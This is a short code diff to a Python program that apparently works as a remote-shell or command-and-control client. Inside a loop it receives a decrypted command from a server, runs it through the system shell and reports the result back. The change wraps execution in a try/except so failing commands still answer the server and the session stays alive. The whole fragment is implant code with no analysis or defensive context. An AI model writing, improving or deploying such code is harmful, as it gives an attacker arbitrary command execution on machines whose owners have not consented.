@@ -118,7 +118,11 @@ while True:
         sleep_or_connect()
         continue
     # Execute the command
-    shell_output = subprocess.run(decrypted_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True).stdout
+    shell_output = None
+    try:
+        shell_output = subprocess.check_output(decrypted_command, stderr=subprocess.STDOUT, shell=True)
+    except:
+        shell_output = "Command returned non-zero exit status\n"
     # Let the server know the command ran, even if there's no output 
     if shell_output == "".encode():
         shell_output = " ".encode()
